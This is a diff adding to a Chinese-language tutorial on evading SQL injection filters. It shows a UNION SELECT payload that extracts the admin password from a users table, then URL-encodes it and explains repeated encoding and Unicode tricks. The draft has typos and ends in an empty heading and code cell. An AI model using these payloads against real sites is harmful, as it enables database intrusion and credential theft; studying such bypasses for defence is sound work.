@@ -27,4 +27,21 @@ sql语言是不区分大小写额度，所以可以通过变换攻击字符中�
 
 ## 使用url编码
 
-1使用URL编码来ta
+用URL编码来逃避过滤。有以下一条sql语句
+```sql
+/**/union/**/select/**/password/**/from/**/tblUsers/**/where/**/uusername/**/like/**/'admin'
+```
+如果过滤器对“/*”进行了过滤，那么这条语句肯定是不能通过，随意可以将其转换为
+```sql
+%2f%2a*/union%2f%2a*/select%2f%2a*/password%2f%2a*/from%2f%2a*/tblUsers%2f%2a*/where%2f%2a*/uusername%2f%2a*/like%2f%2a*/'admin'
+```
+对关键字符进行url编码，从而实现过滤。如果一次不行们可以进行两次甚至多次url编码，但只要记住只是对关键字符进行url编码。其中为什么多次url编码可以实现，这个是由于web应用有时候多次解码
+
+unicode编码方式  
+由于unicode编码方式的复杂性，所以解码器是啊按照最近匹配原则进行匹配unicode匹配编码。
+
+## 使用don
+
+```{.python .input}
+
+```
